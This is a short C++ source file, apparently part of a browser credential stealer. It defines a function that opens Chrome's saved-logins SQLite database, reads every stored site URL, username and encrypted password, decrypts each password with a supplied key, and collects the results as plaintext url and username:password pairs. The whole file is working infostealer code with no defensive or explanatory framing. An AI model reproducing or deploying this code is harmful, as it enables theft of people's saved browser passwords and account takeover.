#include "local.hpp"
#include <sqlite3.h>

void chrome::get_pairs_b80(std::multimap<std::string, std::string>& ret, const std::string db_path, std::vector<uint8_t>& key)
{
	sqlite3* db;
	sqlite3_open(db_path.c_str(), &db);
	sqlite3_stmt* stmt;
	sqlite3_prepare(db, "SELECT origin_url, username_value, password_value FROM logins", 61, &stmt, nullptr);
	while (sqlite3_step(stmt) != SQLITE_DONE)
	{
		std::pair<std::string, std::string> pair = std::make_pair(std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0))), std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1))));
		std::vector<uint8_t> password(sqlite3_column_bytes(stmt, 2));
		std::memcpy(password.data(), sqlite3_column_blob(stmt, 2), password.size());
		std::string decrypted_password = chrome::password_decrypt(password, key);
		pair.second += ':' + decrypted_password;
		ret.insert(pair);
	}
	sqlite3_finalize(stmt);
	sqlite3_close(db);
	return;
}